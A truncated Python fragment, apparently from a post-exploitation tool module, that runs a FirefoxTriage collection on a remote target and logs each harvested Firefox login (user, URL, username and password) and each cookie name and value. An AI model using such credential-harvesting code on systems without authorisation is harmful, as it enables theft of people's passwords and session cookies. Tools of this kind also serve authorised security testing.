        ...
        def firefox_callback(secret):
            if isinstance(secret, FirefoxData):
                ...
                context.log.highlight(
                    f"[{secret.winuser}] {url} {secret.username}:{secret.password}"
                )
                ...
                context.log.highlight(
                    f"[{secret.winuser}] {secret.host}{secret.path} {secret.cookie_name}:{secret.cookie_value}"
                )

        try:
            # Collect Firefox stored secrets
            firefox_triage = FirefoxTriage(
                target=target, logger=context.log, per_secret_callback=firefox_callback
            )
